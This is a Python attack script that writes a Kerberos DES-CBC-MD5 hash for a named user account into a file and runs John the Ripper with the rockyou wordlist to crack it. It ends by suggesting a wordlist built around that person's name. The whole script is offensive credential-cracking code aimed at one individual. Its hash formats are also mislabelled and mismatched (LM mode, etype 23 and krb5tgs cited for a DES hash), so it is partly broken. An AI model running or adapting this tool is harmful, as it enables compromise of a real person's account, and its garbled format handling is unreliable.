#!/usr/bin/env python3
"""
Script to crack Kerberos DES-CBC-MD5 hash using hashcat
This targets the DES hash which is typically easier to crack than NTLM
"""

import os
import subprocess
import argparse

def prepare_des_hash_file(output_file):
    """
    Prepare a hashcat-compatible file for the Kerberos DES hash
    Format for hashcat mode 3000 (LM): $LM$<hex_hash>
    """
    # Jean-Marc Samson hash details
    des_hash = "b09b49d08ab557f2"
    username = "jean-marc.samson"
    salt = "SVH-0236-S-17jean-marc.samson"
    
    # Format for hashcat Kerberos mode (kerberos 5 TGS-REP etype 23)
    # Note: Direct DES format isn't directly supported by hashcat, so we'll use John format 
    # and then convert it for hashcat if needed
    
    john_format = f"{username}:$k5$SVH-0236-S-17jean-marc.samson${des_hash}"
    
    with open(output_file, 'w') as f:
        f.write(john_format)
    
    print(f"[+] Hash file created: {output_file}")
    print(f"[+] Hash format: {john_format}")
    print("[*] Note: This format works with John the Ripper directly")
    return output_file

def crack_with_john(hash_file, wordlist):
    """
    Attempt to crack the hash using John the Ripper
    John has better native support for Kerberos DES hashes
    """
    print(f"[*] Attempting to crack using John the Ripper with wordlist: {wordlist}")
    
    # Check if john exists in path
    john_path = "/workspaces/JaiziahGreene/john-jumbo/run/john"
    if not os.path.exists(john_path):
        print(f"[-] John the Ripper not found at {john_path}")
        return False
    
    # Command to run john with the krb5tgs format
    cmd = [
        john_path,
        "--format=krb5tgs",
        f"--wordlist={wordlist}",
        hash_file
    ]
    
    print(f"[*] Running command: {' '.join(cmd)}")
    
    try:
        process = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
        
        print(process.stdout)
        
        if process.returncode != 0:
            print(f"[-] John command failed with error:")
            print(process.stderr)
            return False
        
        # Check if password was found
        show_cmd = [john_path, "--show", "--format=krb5tgs", hash_file]
        show_process = subprocess.run(
            show_cmd,
            capture_output=True,
            text=True
        )
        
        print(f"[+] John results:")
        print(show_process.stdout)
        
        if "password hashes cracked" in show_process.stdout:
            print("[+] Password successfully cracked!")
            return True
        else:
            print("[-] Password not found with this wordlist.")
            return False
        
    except Exception as e:
        print(f"[-] Error running John: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Crack Kerberos DES-CBC-MD5 hash using John the Ripper")
    parser.add_argument("--wordlist", "-w", default="/workspaces/JaiziahGreene/hashcat/rockyou.txt",
                        help="Path to wordlist file")
    args = parser.parse_args()
    
    # Create hash file
    des_hash_file = "/workspaces/JaiziahGreene/des_kerberos_hash.txt"
    prepare_des_hash_file(des_hash_file)
    
    # Try cracking with John the Ripper
    if crack_with_john(des_hash_file, args.wordlist):
        print("[+] Successfully cracked using John!")
    else:
        print("[-] Failed to crack with the provided wordlist.")
        print("[*] You might want to try another wordlist or use hashcat with a custom rule.")
        
        # Suggestion for more targeted approach
        print("\n[*] Consider creating a targeted wordlist for this user:")
        print("    - The user is 'jean-marc.samson'")
        print("    - Try variations of names, common passwords, or domain-specific words")
        print("    - Use the generate_targeted_wordlist.py script to create custom wordlists")

if __name__ == "__main__":
    main()
